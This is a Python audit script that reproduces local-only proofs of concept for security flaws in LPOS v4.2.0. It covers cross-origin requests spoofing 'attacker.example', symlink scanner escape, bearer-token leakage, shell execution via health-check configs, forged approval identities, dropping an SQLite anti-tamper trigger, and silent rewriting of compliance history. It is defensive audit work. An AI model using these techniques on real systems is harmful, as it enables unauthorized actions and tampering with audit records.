#!/usr/bin/env python3
"""Safe, local-only reproductions for the LPOS v4.2.0 compliance audit.

All network activity is confined to 127.0.0.1, all commands only create marker
files inside the evidence workspace, and all identities/tokens are canaries.
"""
from __future__ import annotations

import hashlib
import http.client
import json
import os
import shlex
import shutil
import sqlite3
import stat
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

RELEASE = Path(os.environ.get("LPOS_RELEASE_ROOT", "/mnt/data/lpos_audit/release-clean/LPOS-v4.2.0")).resolve()
OUT = Path(os.environ.get("LPOS_AUDIT_REPRO_ROOT", "/mnt/data/lpos_audit/output/evidence/repro_workspace")).resolve()


def mode(path: Path) -> str:
    return oct(stat.S_IMODE(path.stat().st_mode))


def world_readable(path: Path) -> bool:
    return bool(stat.S_IMODE(path.stat().st_mode) & stat.S_IROTH)


def sha256(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def dashboard_repro() -> dict[str, Any]:
    from lpos_engine.dashboard.server import DashboardApp, DashboardServer
    from lpos_engine.dashboard import scanner

    root = OUT / "dashboard"
    shutil.rmtree(root, ignore_errors=True)
    project = root / "projects" / "demo"
    project.mkdir(parents=True)
    (project / "project.json").write_text(json.dumps({"name": "Demo Project"}), encoding="utf-8")

    app = DashboardApp(root=root, opener=lambda command: None)
    project_doc = app.projects()["projects"][0]
    project_id = project_doc["id"]
    server = DashboardServer(app, host="127.0.0.1", port=0)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        host, port = server.server_address[:2]
        conn = http.client.HTTPConnection(host, port, timeout=5)
        body = b"{}"
        conn.request(
            "POST",
            f"/api/projects/{project_id}/archive",
            body=body,
            headers={
                "Host": "attacker.example",
                "Origin": "https://attacker.example",
                "Content-Type": "text/plain",
                "Content-Length": str(len(body)),
            },
        )
        response = conn.getresponse()
        payload = json.loads(response.read().decode("utf-8"))
        response_headers = {k.lower(): v for k, v in response.getheaders()}
        conn.close()
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)

    state = json.loads(app.state_file.read_text(encoding="utf-8"))
    archived = state["projects"][project_id]["bucket"] == "archived"

    outside = OUT / "outside-project-data"
    shutil.rmtree(outside, ignore_errors=True)
    outside.mkdir(parents=True)
    marker = outside / "AUDIT_OUTSIDE_MARKER.txt"
    marker.write_text("outside configured root", encoding="utf-8")
    link = root / "projects" / "linked-external"
    link.symlink_to(outside, target_is_directory=True)
    search = scanner.search(root, "AUDIT_OUTSIDE_MARKER")
    escaped = any(Path(item["path"]).resolve().is_relative_to(outside.resolve()) for item in search["files"])

    return {
        "unauthenticated_cross_origin_mutation": {
            "http_status": response.status,
            "response": payload,
            "attacker_host_accepted": True,
            "attacker_origin_accepted": True,
            "text_plain_body_accepted": True,
            "state_changed_to_archived": archived,
            "response_security_headers": {
                name: response_headers.get(name)
                for name in (
                    "content-security-policy",
                    "x-content-type-options",
                    "x-frame-options",
                    "referrer-policy",
                )
            },
        },
        "scanner_root_escape": {
            "symlink_project_discovered": any(Path(p["path"]).name == "linked-external" for p in scanner.scan_projects(root)),
            "outside_filename_exposed": escaped,
            "matches": search["files"],
        },
        "state_file": str(app.state_file),
        "state_mode": mode(app.state_file),
        "state_world_readable": world_readable(app.state_file),
    }


class CaptureHandler(BaseHTTPRequestHandler):
    received: list[dict[str, str]] = []

    def do_GET(self) -> None:  # noqa: N802
        self.__class__.received.append(
            {"path": self.path, "authorization": self.headers.get("Authorization", "")}
        )
        body = b'{"ok":true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
        pass


def monitor_repro() -> dict[str, Any]:
    from lpos_engine.monitor.audit import run_audit
    from lpos_engine.monitor.checks import check_github_api, check_command

    root = OUT / "monitor"
    shutil.rmtree(root, ignore_errors=True)
    root.mkdir(parents=True)

    CaptureHandler.received = []
    capture = ThreadingHTTPServer(("127.0.0.1", 0), CaptureHandler)
    thread = threading.Thread(target=capture.serve_forever, daemon=True)
    thread.start()
    token_file = root / "canary-token.txt"
    token_file.write_text("AUDIT-CANARY-SECRET", encoding="utf-8")
    os.chmod(token_file, 0o600)
    try:
        host, port = capture.server_address[:2]
        entry = {
            "id": "canary-vcs",
            "kind": "vcs",
            "check": {
                "type": "github_api",
                "url": f"http://{host}:{port}/capture",
                "token_file": str(token_file),
            },
        }
        check_result = check_github_api(entry, timeout=2)
    finally:
        capture.shutdown()
        capture.server_close()
        thread.join(timeout=5)

    direct_marker = root / "direct-shell-marker.txt"
    direct_command = f"printf direct-shell-executed > {shlex.quote(str(direct_marker))}"
    direct_result = check_command(
        {"id": "direct-command", "check": {"type": "command", "command": direct_command}},
        timeout=2,
    )

    audit_marker = root / "agent-registered-shell-marker.txt"
    services = root / "state" / "services.json"
    services.parent.mkdir(parents=True)
    services.write_text(
        json.dumps(
            {
                "services": [
                    {
                        "id": "agent-owned-service",
                        "name": "Agent-owned service",
                        "kind": "self_built",
                        "criticality": "critical",
                        "check": {
                            "type": "command",
                            "command": f"printf agent-registered-command-executed > {shlex.quote(str(audit_marker))}",
                        },
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    audit_result = run_audit(root, timeout=2, retry_delay=0, sleep=lambda _: None)

    inventory = root / "monitor" / "inventory.json"
    state = root / "monitor" / "state.json"
    status = root / "monitor" / "status.json"
    captured = list(CaptureHandler.received)
    return {
        "credential_exfiltration": {
            "health_check_succeeded": bool(check_result.ok),
            "captured_requests": captured,
            "canary_bearer_received_by_configured_url": any(
                item["authorization"] == "Bearer AUDIT-CANARY-SECRET" for item in captured
            ),
        },
        "shell_command_execution": {
            "direct_check_succeeded": bool(direct_result.ok),
            "direct_marker_created": direct_marker.is_file(),
            "registered_service_audit_overall": audit_result["overall"],
            "registered_service_marker_created": audit_marker.is_file(),
            "audit_summary": audit_result,
        },
        "file_modes": {
            "inventory": mode(inventory),
            "state": mode(state),
            "status": mode(status),
        },
        "world_readable": {
            "inventory": world_readable(inventory),
            "state": world_readable(state),
            "status": world_readable(status),
        },
    }


def approval_and_database_repro() -> dict[str, Any]:
    from lpos_engine.engine import LPOSRuntime, RuntimeConfig
    from lpos_engine.models import MessageIdentity

    root = OUT / "approval"
    shutil.rmtree(root, ignore_errors=True)
    root.mkdir(parents=True)
    db = root / "state" / "lpos.db"
    runtime = LPOSRuntime.local(
        RuntimeConfig(db, verified_identities={"email": ("principal@example.com",)}),
        file_action_root=root / "files",
    )
    task = runtime.submit_task("Draft and send a local audit canary", required_capabilities=("writing",))
    runtime.create_artifact(task.task_id)
    plan, request = runtime.plan_action(
        task.task_id,
        kind="external_send",
        parameters={"to": "nobody@example.invalid", "body": "audit canary"},
        external=True,
        reversible=False,
        idempotency_key="audit-identity-forgery",
    )
    assert request is not None
    fabricated = MessageIdentity(
        channel="email",
        provider="attacker-controlled-provider",
        message_id="fabricated-message-id",
        thread_id="fabricated-thread-id",
        sender="principal@example.com",
    )
    grant = runtime.grant_action_approval(
        request.question_id,
        message_identity=fabricated,
        verified_identity="principal@example.com",
    )
    action_result = runtime.apply_action(plan.action_id)

    with sqlite3.connect(db) as conn:
        trigger_names = [r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='trigger' ORDER BY name")]
        row = conn.execute("SELECT sequence, payload_json FROM events ORDER BY sequence LIMIT 1").fetchone()
        assert row is not None
        sequence, before_payload = int(row[0]), str(row[1])
        ordinary_update_blocked = False
        try:
            conn.execute("UPDATE events SET payload_json=? WHERE sequence=?", ('{"tampered":true}', sequence))
            conn.commit()
        except sqlite3.DatabaseError:
            ordinary_update_blocked = True
            conn.rollback()
        conn.execute("DROP TRIGGER events_no_update")
        conn.execute("UPDATE events SET payload_json=? WHERE sequence=?", ('{"tampered":true}', sequence))
        conn.commit()
        after_payload = conn.execute("SELECT payload_json FROM events WHERE sequence=?", (sequence,)).fetchone()[0]

    backup = root / "backup-copy.db"
    shutil.copy2(db, backup)
    with sqlite3.connect(backup) as conn:
        backup_integrity = conn.execute("PRAGMA integrity_check").fetchone()[0]

    return {
        "fabricated_approval_identity": {
            "caller_constructed_identity_accepted": True,
            "fabricated_provider": grant.message_identity.provider,
            "fabricated_message_id": grant.message_identity.message_id,
            "grant_created": bool(grant.grant_id),
            "action_applied": bool(action_result.success),
            "action_adapter": action_result.adapter,
            "action_output": dict(action_result.output),
        },
        "database_permissions": {
            "path": str(db),
            "mode": mode(db),
            "world_readable": world_readable(db),
        },
        "event_tamper_resistance": {
            "triggers_initially_present": trigger_names,
            "ordinary_update_blocked": ordinary_update_blocked,
            "same_database_owner_dropped_trigger": True,
            "payload_changed_after_trigger_drop": before_payload != after_payload,
            "after_payload": after_payload,
        },
        "closed_database_copy_restore": {
            "backup_integrity": backup_integrity,
            "backup_sha256": sha256(backup),
        },
    }


def compliance_false_positive_repro() -> dict[str, Any]:
    from lpos_engine.compliance.audit import run_audit, history_path, status_path

    root = OUT / "compliance"
    shutil.rmtree(root, ignore_errors=True)
    root.mkdir(parents=True)
    result = run_audit(RELEASE, root, now="2026-07-22T13:00:00+00:00")
    history = history_path(root)
    status = status_path(root)
    lines = [json.loads(line) for line in history.read_text(encoding="utf-8").splitlines() if line.strip()]
    timestamps = sorted({line.get("ts") for line in lines})
    return {
        "overall": result.overall,
        "summary": result.status["summary"],
        "coverage": result.status["coverage"],
        "history_control_rows": len(lines),
        "distinct_audit_timestamps": len(timestamps),
        "all_controls_labeled_effective_after_one_audit": result.status["summary"]["effective"] == result.status["summary"]["total"],
        "history_file_mode": mode(history),
        "status_file_mode": mode(status),
        "history_world_readable": world_readable(history),
        "status_world_readable": world_readable(status),
        "history_rewrite_demonstration": {},
    }


def compliance_history_rewrite(result: dict[str, Any]) -> None:
    root = OUT / "compliance"
    history = root / "compliance" / "history.jsonl"
    before = history.read_bytes()
    parsed = [json.loads(line) for line in before.decode().splitlines() if line.strip()]
    removed = parsed.pop(0)
    history.write_text("".join(json.dumps(item) + "\n" for item in parsed), encoding="utf-8")
    after = history.read_bytes()
    result["history_rewrite_demonstration"] = {
        "row_removed_without_detection": len(parsed) + 1 == len(before.decode().splitlines()),
        "removed_control_id": removed.get("control_id"),
        "before_sha256": hashlib.sha256(before).hexdigest(),
        "after_sha256": hashlib.sha256(after).hexdigest(),
        "integrity_chain_or_signature_present": False,
    }


def release_authenticity_repro() -> dict[str, Any]:
    root = OUT / "release-authenticity"
    shutil.rmtree(root, ignore_errors=True)
    shutil.copytree(RELEASE, root, ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".pytest_cache", ".coverage", "build"))

    verify_before = subprocess.run(
        [sys.executable, "verify_release.py"], cwd=root, text=True, capture_output=True, timeout=30
    )
    readme = root / "README.md"
    readme.write_text(readme.read_text(encoding="utf-8") + "\nAUDIT TAMPER CANARY\n", encoding="utf-8")
    verify_tampered = subprocess.run(
        [sys.executable, "verify_release.py"], cwd=root, text=True, capture_output=True, timeout=30
    )
    reseal = subprocess.run(
        [sys.executable, "tools/reseal.py"], cwd=root, text=True, capture_output=True, timeout=30
    )
    verify_resealed = subprocess.run(
        [sys.executable, "verify_release.py"], cwd=root, text=True, capture_output=True, timeout=30
    )
    signature_files = [
        p.relative_to(root).as_posix()
        for p in root.rglob("*")
        if p.is_file() and p.suffix.lower() in {".sig", ".asc", ".minisig", ".pem", ".pub"}
    ]
    provenance_files = [
        p.relative_to(root).as_posix()
        for p in root.rglob("*")
        if p.is_file()
        and any(term in p.name.lower() for term in ("sbom", "provenance", "attestation", "slsa"))
    ]
    return {
        "clean_verification_passed": verify_before.returncode == 0,
        "tamper_detected_before_reseal": verify_tampered.returncode != 0,
        "reseal_completed": reseal.returncode == 0,
        "tampered_tree_passed_after_self_reseal": verify_resealed.returncode == 0,
        "verify_tampered_output": (verify_tampered.stdout + verify_tampered.stderr).strip(),
        "reseal_output": (reseal.stdout + reseal.stderr).strip(),
        "verify_resealed_output": (verify_resealed.stdout + verify_resealed.stderr).strip(),
        "signature_files": signature_files,
        "provenance_or_sbom_files": provenance_files,
    }


def package_inventory() -> dict[str, Any]:
    import zipfile

    wheel = next((RELEASE / "Packages").glob("*.whl"))
    with zipfile.ZipFile(wheel) as zf:
        names = zf.namelist()
        metadata_name = next(n for n in names if n.endswith(".dist-info/METADATA"))
        metadata = zf.read(metadata_name).decode("utf-8", errors="replace")
    requires = [line.split(":", 1)[1].strip() for line in metadata.splitlines() if line.startswith("Requires-Dist:")]
    native = [n for n in names if n.endswith((".so", ".dll", ".dylib", ".pyd"))]
    return {
        "wheel": str(wheel),
        "wheel_sha256": sha256(wheel),
        "wheel_entries": len(names),
        "runtime_requires_dist": [r for r in requires if "; extra ==" not in r],
        "all_requires_dist": requires,
        "native_extensions": native,
    }


def main() -> int:
    if not RELEASE.is_dir():
        raise SystemExit(f"release root not found: {RELEASE}")
    shutil.rmtree(OUT, ignore_errors=True)
    OUT.mkdir(parents=True)
    old_umask = os.umask(0)
    os.umask(old_umask)

    results: dict[str, Any] = {
        "metadata": {
            "release_root": str(RELEASE),
            "release_version": json.loads((RELEASE / "RELEASE.json").read_text())["version"],
            "python": sys.version,
            "default_umask": oct(old_umask),
            "local_only": True,
        }
    }
    steps = [
        ("dashboard", dashboard_repro),
        ("monitor", monitor_repro),
        ("approval_and_database", approval_and_database_repro),
        ("compliance_false_positive", compliance_false_positive_repro),
        ("release_authenticity", release_authenticity_repro),
        ("package_inventory", package_inventory),
    ]
    for name, fn in steps:
        try:
            results[name] = fn()
            if name == "compliance_false_positive":
                compliance_history_rewrite(results[name])
        except Exception as exc:  # preserve partial evidence but fail the run
            results[name] = {"error": f"{type(exc).__name__}: {exc}"}

    output = OUT.parent / "reproduction-results.json"
    output.write_text(json.dumps(results, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(json.dumps(results, indent=2, sort_keys=True))
    failed = [name for name, value in results.items() if isinstance(value, dict) and "error" in value]
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
